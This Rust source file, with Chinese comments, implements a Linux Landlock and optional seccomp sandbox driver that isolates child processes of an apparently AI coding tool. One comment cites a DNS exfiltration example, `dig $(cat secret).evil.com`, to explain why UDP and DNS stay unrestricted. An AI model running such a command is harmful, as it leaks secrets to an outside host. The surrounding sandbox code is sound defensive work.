//! Linux Landlock 沙箱驱动（T-M4-1）。
//!
//! 基于 `landlock` crate（rust-landlock，MIT/Apache-2.0）实现 `SandboxDriver` trait。
//! 文件系统隔离：workdir 可写、其余只读、VCS 目录保护、系统只读路径放行。
//!
//! ## apply 时机
//!
//! `apply()` 在**父进程**构建 `RulesetCreated`（打开 `PathFd`、`add_rule`），然后通过
//! `Command::pre_exec` 在**子进程** fork 后 exec 前调用 `restrict_self()`。父进程
//! 不被约束，子进程 exec 后 Landlock 约束持久保持（LSM 级跨 exec）。
//!
//! feature `seccomp` 开启时（A1，默认不开）：父进程侧还预先构建危险 syscall
//! 拒绝过滤器（见 `crate::seccomp`），pre_exec 闭包在 landlock `FullyEnforced`
//! 后追加一次 `seccomp_load`——两层任一失败都使 exec 中止（fail-closed）。
//!
//! ## 旧内核降级
//!
//! `landlock_available()` 用 `HardRequirement` + `create()` 探测内核支持（不约束
//! 探测进程）。内核 < 5.13 或 Landlock 未启用时返回 `false`，`detect_driver()`
//! 据此降级 `NoopDriver` + warn（C-22）。
//!
//! **分级降级（SEC-2，2026-08-25 R2 审查）**：5.13 ≤ 内核 < 6.7 时，FS 限制按
//! 实际支持的 ABI 生效（V1/V2/V3 逐级试探，`build_ruleset` 只 handle 探测通过
//! 的访问集），网络 TCP 拒绝（需 ABI≥4）自动跳过并 warn——此前 ruleset 以
//! BestEffort 同时 handle FS(V3)+Net(ABI4)，pre_exec 对 `PartiallyEnforced`
//! 直接报错，导致这些内核**每次 spawn 必失败**并把用户推向关闭沙箱。现在：
//! 全部 handle 均为探测确认可全量执行的能力，pre_exec 的 `FullyEnforced`
//! 严格校验保持成立（fail-closed 不变式不放松）。
//!
//! ## VCS 保护限制
//!
//! Landlock 规则是"白名单并集"语义：workdir 可写会让其下 `.git` 也继承可写
//! （无法在可写父目录下做子目录只读）。故 VCS 目录（`.git`/`.hg`/`.svn`）的
//! 写保护由应用层 `policy::builtin` 黑名单补充（S5 已落地：fs/shell 写 .git
//! 与约束文件硬 Deny，见 `security.md` §19.1），landlock
//! 仅做粗粒度"workdir 可写、其余只读"隔离。这是 OS 层第二道防线与应用层第一道
//! 防线的分工（见 `security.md` §8）。

use crate::hardening::vcs_protected_dirs;
use landlock::{RulesetAttr, RulesetCreatedAttr};
use minicoding_core::sandbox::{SandboxDriver, SandboxError, SandboxPolicy, SpawnHandle};
use std::os::unix::process::CommandExt;
use std::path::PathBuf;

/// 只读放行的系统路径（命令/库/设备/proc 必须可读，否则子进程无法 exec）。
const SYSTEM_RO_PATHS: &[&str] = &[
    "/usr", "/lib", "/lib64", "/bin", "/sbin", "/etc", "/dev", "/proc",
];

/// Linux Landlock 沙箱驱动。
///
/// 无状态（所有策略通过 `apply` 参数传入），可被 `Runtime` 以 `Arc<dyn SandboxDriver>`
/// 共享。`is_hardened()` 恒 `true`（构造前已由 `landlock_available()` 探测确认）。
pub struct LandlockDriver;

impl LandlockDriver {
    /// 创建 Landlock 驱动。
    ///
    /// 调用方应先经 `landlock_available()` 确认内核支持，否则用 `NoopDriver`。
    #[must_use]
    pub fn new() -> Self {
        Self
    }
}

impl Default for LandlockDriver {
    fn default() -> Self {
        Self::new()
    }
}

impl SandboxDriver for LandlockDriver {
    fn apply(
        &self,
        policy: &SandboxPolicy,
        cmd: &mut std::process::Command,
    ) -> Result<SpawnHandle, SandboxError> {
        match policy {
            SandboxPolicy::ReadOnly | SandboxPolicy::WorkspaceWrite { .. } => {
                apply_landlock(policy, cmd)?;
                Ok(SpawnHandle::default())
            }
            // ExternalSandbox / DangerFullAccess 不应用内核限制（C-22：依赖外部隔离
            // 或用户显式放弃隔离）。NoopDriver 等价语义，但走这里说明用户选了这两
            // 种策略之一，故意不拦。
            SandboxPolicy::ExternalSandbox | SandboxPolicy::DangerFullAccess => {
                Ok(SpawnHandle::default())
            }
        }
    }

    fn is_hardened(&self) -> bool {
        true
    }

    fn id(&self) -> &'static str {
        "landlock"
    }
}

/// 探测内核是否支持 Landlock（不约束探测进程）。
///
/// 用 `HardRequirement` + `create()` 探测：仅调用 `landlock_create_ruleset(2)`，
/// 内核 `ENOSYS`/`EOPNOTSUPP` 时返回 `Err`，据此判定不支持。不调用 `restrict_self`，
/// 不会约束当前进程（见 landlock 研究报告方案 A）。
#[must_use]
pub fn landlock_available() -> bool {
    use landlock::{Access, CompatLevel, Compatible, Ruleset};

    Ruleset::default()
        .handle_access(landlock::AccessFs::from_all(landlock::ABI::V1))
        .ok()
        .map(|r| r.set_compatibility(CompatLevel::HardRequirement))
        .and_then(|r| r.create().ok())
        .is_some()
}

/// 探测内核实际支持的 Landlock FS ABI（SEC-2 分级降级）。
///
/// 从高到低逐级 `HardRequirement` 试探 V3/V2/V1，返回最高可用版本；全不支持
/// 返回 `None`（调用方应走 `NoopDriver` 路径）。探测仅 create ruleset 不约束
/// 当前进程。`pub` 供 doctor 如实报告（此前固定宣称 "V3 target ABI" 与实际
/// 执行的 ABI 不符）。
#[must_use]
pub fn probe_fs_abi() -> Option<landlock::ABI> {
    use landlock::{Access, CompatLevel, Compatible, Ruleset};

    for abi in [landlock::ABI::V3, landlock::ABI::V2, landlock::ABI::V1] {
        let ok = Ruleset::default()
            .set_compatibility(CompatLevel::HardRequirement)
            .handle_access(landlock::AccessFs::from_all(abi))
            .ok()
            .and_then(|r| r.create().ok())
            .is_some();
        if ok {
            return Some(abi);
        }
    }
    None
}

/// 探测内核是否支持 Landlock 网络原语（ABI≥4 / Linux 6.7+，SEC-2）。
/// `pub` 供 doctor 如实报告网络限制可用性。
#[must_use]
pub fn net_restriction_supported() -> bool {
    use landlock::{CompatLevel, Compatible, Ruleset};

    Ruleset::default()
        .set_compatibility(CompatLevel::HardRequirement)
        .handle_access(landlock::AccessNet::BindTcp | landlock::AccessNet::ConnectTcp)
        .ok()
        .and_then(|r| r.create().ok())
        .is_some()
}

/// 在子进程 `pre_exec` 内应用 Landlock 限制（feature `seccomp` 开启时追加
/// seccomp 加载，A1）。
///
/// 父进程构建 `RulesetCreated`（打开 `PathFd`、`add_rule`）与 seccomp 过滤器
/// （`add_arch`/`add_rule`），子进程 `pre_exec` 内仅 `restrict_self()` +
/// `seccomp load`。`Option::take()` 模式解决两者的一次性消费语义与 `pre_exec`
/// 要求 `FnMut` 的冲突。
fn apply_landlock(
    policy: &SandboxPolicy,
    cmd: &mut std::process::Command,
) -> Result<(), SandboxError> {
    let ruleset = build_ruleset(policy)?;
    let mut ruleset_slot = Some(ruleset);

    // A1：父进程侧预先完成 seccomp 过滤器全部构建工作（堆分配集中在 fork 前），
    // pre_exec 闭包内仅剩一次 `load()`。构建失败使 spawn 失败（fail-closed，
    // 与 landlock FullyEnforced 校验同一哲学）。
    #[cfg(feature = "seccomp")]
    let mut seccomp_slot = Some(crate::seccomp::prepare_deny_filter()?);

    // SAFETY: pre_exec 闭包在 fork 后、exec 前的子进程内运行（单线程上下文）。
    // 闭包体内仅做：Option::take（栈操作）+ restrict_self（两个 syscall：
    // landlock_restrict_self + prctl(PR_SET_NO_NEW_PRIVS)）+ 构造栈上
    // RestrictionStatus + drop RulesetCreated（close fd，close(2) async-signal-safe）
    // + feature "seccomp" 时一次 seccomp_load。
    //
    // **诚实边界**：libseccomp 的 `load()` 内部会堆分配（构造 BPF 程序缓冲区），
    // 严格说不是 async-signal-safe。采用 Chromium 同款实践：fork 后 exec 前是
    // 单线程窗口，子进程不会与父进程并发竞争 malloc 锁；残余风险仅为"fork 瞬间
    // 恰有其他线程持有 malloc 锁导致子进程内分配死锁"，业界（Chromium/
    // sandboxed-process 实践）已知并接受该风险——构建阶段已前移至父进程，此处
    // 只剩单次 load 分配，窗口最小化。
    // 成功路径其余部分无堆分配、无锁；错误路径的 to_string 分配仅发生在即将
    // exec 失败时，可接受。
    unsafe {
        cmd.pre_exec(move || {
            let rs = ruleset_slot
                .take()
                .ok_or_else(|| std::io::Error::other("pre_exec invoked twice"))?;
            let status = rs
                .restrict_self()
                .map_err(|e| std::io::Error::other(e.to_string()))?;
            match status.ruleset {
                landlock::RulesetStatus::FullyEnforced => {}
                landlock::RulesetStatus::PartiallyEnforced => {
                    return Err(std::io::Error::other(format!(
                        "landlock only partially enforced: {status:?}"
                    )));
                }
                landlock::RulesetStatus::NotEnforced => {
                    return Err(std::io::Error::other(format!(
                        "landlock not enforced: {status:?}"
                    )));
                }
            }
            // landlock 全量生效后才加载 seccomp（两层防线顺序保证：任一层失败
            // 都使 exec 中止，不存在"半沙箱"子进程逃逸到用户命令）
            #[cfg(feature = "seccomp")]
            if let Some(filter) = seccomp_slot.take() {
                crate::seccomp::load_prepared(&filter)?;
            }
            Ok(())
        });
    }
    Ok(())
}

/// 父进程构建 Landlock ruleset。
///
/// - `ReadOnly`：workdir 只读，所有路径只读放行；
/// - `WorkspaceWrite`：workdir + writable 可写，其余只读，VCS 目录列入只读
///   （注：landlock 并集语义下 workdir 可写会使 .git 继承可写，VCS 实际写保护
///   由应用层 builtin 黑名单补充（S5 已落地），见模块文档）。
#[allow(clippy::too_many_lines)] // 策略分解+SEC-2 分级降级注释与规则添加线性展开，拆分降低可读性
fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, SandboxError> {
    use landlock::{Access, path_beneath_rules};

    // SEC-2 分级降级：只 handle 探测确认可全量执行的访问集。FS 按实际支持
    // ABI；网络仅在内核支持（ABI≥4）时启用——否则 BestEffort 静默降级会让
    // pre_exec 的 FullyEnforced 校验失败（PartiallyEnforced），spawn 必败。
    let fs_abi = probe_fs_abi().ok_or_else(|| {
        SandboxError::Sandbox("landlock FS 限制不可用（应先经 landlock_available 探测）".into())
    })?;
    // SE4-10（R4）：ABI 版本能力降级如实警告——此前静默降级，用户不知道
    // ReadOnly 预设的实际写保护面小于预期。
    // - ABI<V3：truncate(2) 不受 landlock 约束（TRUNCATE 访问权 V3 引入）；
    // - ABI<V5：ioctl-dev（raw 设备访问）不受约束（V5 引入）。
    if fs_abi < landlock::ABI::V3 {
        tracing::warn!(
            ?fs_abi,
            "landlock ABI < V3: truncate(2) 不受内核约束 \
             (ReadOnly 预设的写保护面小于预期)"
        );
    } else if fs_abi < landlock::ABI::V5 {
        tracing::warn!(
            ?fs_abi,
            "landlock ABI < V5: ioctl-dev（raw 设备访问）不受内核约束"
        );
    }
    let restrict_net_requested = matches!(
        policy,
        SandboxPolicy::ReadOnly | SandboxPolicy::WorkspaceWrite { .. }
    );
    let net_supported = net_restriction_supported();
    if restrict_net_requested && !net_supported {
        tracing::warn!(
            "landlock network restriction unavailable on this kernel \
             (requires ABI>=4 / Linux 6.7+): child TCP/UDP/DNS are NOT restricted"
        );
    }
    let restrict_net = restrict_net_requested && net_supported;

    let handled = landlock::AccessFs::from_all(fs_abi);
    let ro_access = landlock::AccessFs::from_read(fs_abi);
    let write_access = landlock::AccessFs::from_all(fs_abi);

    // 网络限制（2026-08-23 审查遗留#1，security.md §8 核心支柱）：
    // ReadOnly/WorkspaceWrite 下拒绝子进程 TCP bind/connect（landlock ABI≥4，
    // Linux 6.7+；旧内核经上方探测自动跳过并 warn——SEC-2 分级降级）。
    // 不为网络添加任何 allow 规则 = 全部拒绝。web.fetch 在主进程内执行不受
    // 影响（沙箱只作用于 spawn 的子进程）；需要子进程联网用 external-sandbox/
    // danger-full-access。
    //
    // **诚实边界（2026-08-25 审查 §6.1-S3）**：landlock ABI4 网络原语仅覆盖
    // TCP——UDP/DNS/ICMP/raw socket **不受限**，"deny all TCP"≠断网。沙箱子
    // 进程仍可用 DNS 查询（`dig $(cat secret).evil.com`）或任意 UDP 报文对外
    // 通信。A1 seccomp 为 deny-list 策略（只封危险 syscall，不碰网络类，
    // 见 `seccomp.rs` 模块文档），UDP/DNS 通道由应用层 DNS 解析-连接 IP
    // pinning（A2，`minicoding-tools::web`）另行处理；doctor 与文档须如实
    // 描述该边界。
    let mut ruleset = make_base_ruleset(handled, restrict_net)?
        .create()
        .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
    if restrict_net {
        tracing::info!(
            "landlock network restriction enabled (deny all TCP for child processes; \
             UDP/DNS remain unrestricted until seccomp lands)"
        );
    }

    // 系统只读路径放行（必须，否则子进程无法 exec / 读库）
    ruleset = ruleset
        .add_rules(path_beneath_rules(
            SYSTEM_RO_PATHS.iter().copied(),
            ro_access,
        ))
        .map_err(|e| SandboxError::Sandbox(e.to_string()))?;

    // HOME 细粒度只读白名单（A3）+ TMPDIR 读写：landlock 未列入规则的路径
    // **连读都拒绝**——白名单覆盖工具链/缓存常见落点（cargo/rustup/config/
    // cache/local/nvm/volta/npm/go），满足编译与包管理读取需求；TMPDIR 读写
    // 满足编译临时目录。
    //
    // **诚实边界（A3 收敛，2026-08-25 审查 §6.2-S4 修复）**：旧语义对 $HOME
    // 整体只读放行，沙箱内命令可读取 `~/.ssh`、`~/.aws`、`~/.gnupg` 等全部用户
    // 凭证并复制进可写的 workdir。收敛为白名单后凭证目录不再可读；代价是
    // 白名单外的私有工具链在沙箱内不可见——此类场景走 external-sandbox 兜底。
    //
    // SEC-R6-2（2026-08-28 R6 审查）：`home_read_allow_paths_without_credentials`
    // 展开白名单排除 `~/.config/gh`/`~/.config/gcloud`/`~/.cargo/credentials`
    // 等活凭证落点——landlock crate 0.4.x 无 deny 规则支持，`path_beneath` 的
    // allow 会覆盖子路径，此前 Linux 侧 `~/.config` 白名单连带放行凭证目录
    // （`credential_dir_deny_paths` 仅 macOS Seatbelt 消费）。
    let home_allow = crate::hardening::home_read_allow_paths_without_credentials();
    if !home_allow.is_empty() {
        tracing::info!(
            paths = ?home_allow,
            "landlock HOME 读白名单生效（凭证目录不可读，A3）"
        );
        ruleset = ruleset
            .add_rules(path_beneath_rules(
                home_allow.iter().map(PathBuf::as_path),
                ro_access,
            ))
            .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
    }
    let tmpdir = std::env::var("TMPDIR").unwrap_or_else(|_| "/tmp".to_string());
    ruleset = ruleset
        .add_rules(path_beneath_rules([tmpdir.as_str()], write_access))
        .map_err(|e| SandboxError::Sandbox(e.to_string()))?;

    // 按策略放行 workdir / writable
    let (workdir, writable): (PathBuf, Vec<PathBuf>) = match policy {
        SandboxPolicy::ReadOnly => {
            // ReadOnly：workdir 默认为当前目录，只读放行
            (
                std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
                vec![],
            )
        }
        SandboxPolicy::WorkspaceWrite { workdir, writable } => (
            workdir.clone().into_std_path_buf(),
            writable
                .iter()
                .map(|p| p.clone().into_std_path_buf())
                .collect(),
        ),
        SandboxPolicy::ExternalSandbox | SandboxPolicy::DangerFullAccess => {
            // 这两种策略不应用 landlock（apply() 已提前返回 Ok），不应到达此处
            return Err(SandboxError::Sandbox(
                "build_ruleset 不应为 ExternalSandbox/DangerFullAccess 调用".into(),
            ));
        }
    };

    let workdir_str = workdir.to_string_lossy().into_owned();
    let writable_strs: Vec<String> = writable
        .iter()
        .map(|p| p.to_string_lossy().into_owned())
        .collect();

    if matches!(policy, SandboxPolicy::WorkspaceWrite { .. }) {
        // workdir 可写
        ruleset = ruleset
            .add_rules(path_beneath_rules([workdir_str.as_str()], write_access))
            .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
        // 额外 writable 可写
        if !writable_strs.is_empty() {
            ruleset = ruleset
                .add_rules(path_beneath_rules(
                    writable_strs.iter().map(String::as_str),
                    write_access,
                ))
                .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
        }
    } else {
        // ReadOnly：workdir 只读放行
        ruleset = ruleset
            .add_rules(path_beneath_rules([workdir_str.as_str()], ro_access))
            .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
    }

    // VCS 目录只读保护（best effort：landlock 并集语义下若 workdir 可写则 .git
    // 仍可写，此处规则在 workdir 只读场景下生效；workdir 可写场景由应用层补充）
    let vcs_dirs = vcs_protected_dirs(&workdir);
    let vcs_strs: Vec<String> = vcs_dirs
        .iter()
        .map(|p| p.to_string_lossy().into_owned())
        .collect();
    if !vcs_strs.is_empty() {
        ruleset = ruleset
            .add_rules(path_beneath_rules(
                vcs_strs.iter().map(String::as_str),
                ro_access,
            ))
            .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
    }

    Ok(ruleset)
}

/// 构造基础 Ruleset：fs handle 全量 + 可选 TCP 网络拒绝（`restrict_net`）。
///
/// `restrict_net` 由调用方经 [`net_restriction_supported`] 探测后决定（SEC-2），
/// 本函数不再做 `BestEffort` 静默降级——所有 handle 均可全量执行，保证
/// `restrict_self()` 返回 `FullyEnforced`。网络仅覆盖 TCP 原语，UDP/DNS 残留
/// 通道由应用层 IP pinning（A2）处理；危险 syscall 由 seccomp deny-list
/// （A1，feature gate）拦截。
fn make_base_ruleset(
    handled: landlock::BitFlags<landlock::AccessFs>,
    restrict_net: bool,
) -> Result<landlock::Ruleset, SandboxError> {
    use landlock::{AccessNet, Ruleset};
    let base = if restrict_net {
        Ruleset::default()
            .handle_access(handled)
            .map_err(|e| SandboxError::Sandbox(e.to_string()))?
            .handle_access(AccessNet::BindTcp | AccessNet::ConnectTcp)
            .map_err(|e| SandboxError::Sandbox(format!("net access: {e}")))?
    } else {
        Ruleset::default()
            .handle_access(handled)
            .map_err(|e| SandboxError::Sandbox(e.to_string()))?
    };
    Ok(base)
}

#[cfg(test)]
mod tests {
    #![allow(clippy::pedantic)]
    use super::*;

    #[test]
    fn landlock_available_does_not_panic() {
        // 仅验证探测函数可调用、不 panic；实际 true/false 取决于内核
        let _ = landlock_available();
    }

    #[test]
    fn probe_fs_abi_matches_availability() {
        // SEC-2：landlock_available()（V1 探测）为真时，probe_fs_abi 必须返回
        // Some（至少 V1 可用）；为假时两者应一致为不支持。
        let available = landlock_available();
        assert_eq!(
            probe_fs_abi().is_some(),
            available,
            "probe_fs_abi 与 landlock_available 探测结论不一致"
        );
    }

    #[test]
    fn net_probe_does_not_panic() {
        // 实际 true/false 取决于内核（ABI>=4）；仅验证可调用、不 panic
        let _ = net_restriction_supported();
    }

    #[test]
    fn driver_id_and_hardened() {
        let d = LandlockDriver::new();
        assert_eq!(d.id(), "landlock");
        assert!(d.is_hardened());
    }

    #[test]
    fn external_and_full_access_are_noop() {
        // ExternalSandbox / DangerFullAccess 不应用 landlock（apply 返回 Ok 不加 pre_exec）
        let d = LandlockDriver::new();
        let mut cmd = std::process::Command::new("true");
        d.apply(&SandboxPolicy::ExternalSandbox, &mut cmd).unwrap();
        d.apply(&SandboxPolicy::DangerFullAccess, &mut cmd).unwrap();
    }
}
